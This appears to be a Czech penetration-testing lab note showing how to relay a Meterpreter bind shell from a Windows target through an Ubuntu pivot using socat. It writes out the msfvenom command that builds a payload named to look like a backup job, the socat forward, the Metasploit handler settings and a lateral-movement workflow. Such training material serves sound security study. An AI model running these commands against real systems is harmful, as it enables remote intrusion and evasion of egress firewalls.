# SOCAT Bind Shell / TCP Redirector

## Účel

**Bind Shell** je opačný princip než reverse shell.

Místo aby se oběť připojovala k útočníkovi:

```
Reverse Shell:

Target  --->  Attacker
```

oběť otevře port a útočník se připojí:

```
Bind Shell:

Attacker  --->  Target
```

Socat zde slouží jako **mezivrstva**, která zpřístupní interní bind shell přes pivot host.

---

# Scénář

Máme:

- Kali (útočník)
- Ubuntu (pivot host)
- Windows (cílový server)

Síť:

```
Kali
10.10.14.18
    |
    |
    v
Ubuntu Pivot
172.16.5.129
    |
    |
    v
Windows Target
172.16.5.19
```

Problém:

- Windows blokuje outbound komunikaci
- reverse shell nefunguje
- interní komunikace Ubuntu → Windows funguje

Řešení:

- Windows otevře bind port
- Ubuntu udělá TCP forward
- Kali se připojí přes Ubuntu

---

# 1. Vytvoření Bind Payloadu

Na Kali:

```
msfvenom -p windows/x64/meterpreter/bind_tcp \
LPORT=8443 \
-f exe \
-o backupjob.exe
```

Výsledek:

```
backupjob.exe
```

Po spuštění:

```
Windows:8443 LISTENING
```

Windows čeká na spojení.

---

# 2. Socat Forward na Pivot Hostu

Na Ubuntu:

```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Význam:

```
Ubuntu:8080
      |
      |
      v
Windows:8443
```

Parametry:

|Parametr|Význam|
|---|---|
|TCP4-LISTEN|otevře listener|
|8080|port dostupný z Kali|
|fork|umožní více spojení|
|TCP4|TCP forwarding|
|172.16.5.19:8443|bind shell na Windows|

---

# 3. Připojení z Metasploitu

Na Kali:

```
use exploit/multi/handler

set payload windows/x64/meterpreter/bind_tcp

set RHOST 10.129.202.64

set LPORT 8080

run
```

Rozdíl proti reverse shellu:

Reverse:

```
set LHOST
čekám na spojení
```

Bind:

```
set RHOST
já se připojuji
```

---

# Tok komunikace

```
        Kali
          |
          |
          v
   Ubuntu:8080
          |
       Socat
          |
          |
          v
 Windows:8443
          |
          |
     Meterpreter
```

---

# Kdy použít Bind Shell

## 1. Omezený Egress Firewall

Situace:

Windows:

```
DENY:
Internet
Kali
Externí IP
```

Ale:

```
ALLOW:
Ubuntu ---> Windows
```

Reverse shell:

```
Windows ---> Kali
❌ blokováno
```

Bind shell:

```
Kali ---> Ubuntu ---> Windows
✅ funguje
```

---

# 2. Stabilní přístup

Reverse shell:

```
spadne spojení
↓
payload skončí
↓
nutný nový exploit
```

Bind shell:

```
port stále otevřený
↓
znovu se připojíš
↓
pokračuješ
```

---

# 3. Lateral Movement přes více pivotů

Možný řetězec:

```
Kali

↓

Pivot 1
Ubuntu

↓

Pivot 2
Linux Server

↓

Windows Bind Shell
```

Každý host vidí pouze svého souseda.

---

# Kontrola portů

Na Windows:

```
netstat -ano
```

Hledáš:

```
TCP 0.0.0.0:8443 LISTENING
```

---

Na Ubuntu:

```
ss -tlnp
```

Výsledek:

```
LISTEN 0.0.0.0:8080
```

---

# Bind Shell vs Reverse Shell

|Vlastnost|Reverse Shell|Bind Shell|
|---|---|---|
|Směr spojení|Target → Attacker|Attacker → Target|
|Firewall|potřebuje outbound|potřebuje inbound|
|Nejčastější použití|Ano|Specifické situace|
|Riziko|méně viditelný port|otevřený port na cíli|
|Stabilita|závislá na spojení|lepší reconnect|

---

# Nevýhody Bind Shell

## 1. Otevřený port

Bind shell vytváří:

```
Windows:8443 LISTENING
```

Interní sken:

```
nmap -p 8443 172.16.5.19
```

může odhalit službu.

---

## 2. Přístup bez autentizace

Základní bind TCP shell:

- neověřuje uživatele
- kdokoliv, kdo dosáhne portu, se může připojit

---

# Pentester Workflow

```
1.
Získám pivot host

↓

2.
Zjistím síťové vztahy

ip route
ifconfig

↓

3.
Zjistím, že reverse shell nejde

↓

4.
Vytvořím bind payload

msfvenom bind_tcp

↓

5.
Spustím Socat redirect

socat TCP4-LISTEN

↓

6.
Připojím Metasploit handler

↓

7.
Získám Meterpreter
```